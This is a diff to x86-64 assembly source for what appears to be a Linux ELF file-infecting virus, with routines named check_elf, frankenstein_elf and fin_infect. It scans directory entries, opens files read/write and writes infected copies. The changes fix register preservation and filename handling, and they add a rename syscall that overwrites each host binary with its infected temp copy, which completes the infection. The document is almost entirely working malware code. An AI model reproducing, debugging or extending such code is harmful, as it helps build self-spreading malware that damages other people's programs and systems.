@@ -464,11 +464,13 @@ process_dirents:
 check_file:
 	push rcx
 	check_elf:
+		push rcx					;preserve rcx before syscall
 		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
 		mov rsi, 0x2 						;flags - read/write (OPEN_RDWR) in rsi
 		xor rdx, rdx						;mode - 0
 		mov rax, 0x2						;SYS_OPEN ==0x2
 		syscall
+		pop rcx						;restore rcx for dirent offset
 
 		cmp rax, 0
 		jb checknext
@@ -476,9 +478,9 @@ check_file:
 		mov r8, rax
 		mov [r14 + 144], rax
 		xor r12, r12
-		mov rsi, rdi
+		;mov rsi, rdi
 		lea rdi, [r14 + 200] 
-		lea rsi, [rdi]
+		lea rsi, [rcx + r14 + 618]
 		.copy_filename:
 			mov byte al, [rsi]
 			inc rsi
@@ -584,6 +586,15 @@ check_file:
 		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, 0xB ;SYS_MUNMAP
 		syscall
+
+	;workaround to ensure that filename stored at r14 + 200
+	;is cleared (except for the first two bytes)
+	;so that target filename does not retain leftover chars
+	;from previous filename save
+		lea rdi, [r14 + 201]
+		xor rax, rax
+		mov qword [rdi], 0x01
+
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
@@ -1040,6 +1051,11 @@ frankenstein_elf:
 	.close_temp:		
 		mov rdi, r9						;close temp file
 		mov rax, 0x3 					;SYS_CLOSE
+		syscall
+	.rename_temp_to_host:		
+		lea rdi, [r14 + 0x800]			;name of temp file in rdi
+		lea rsi, [r14 + 200]			;original name of host file in rsi
+		mov rax, 0x52 					;SYS_RENAME
 		syscall
 fin_infect:
 	ret
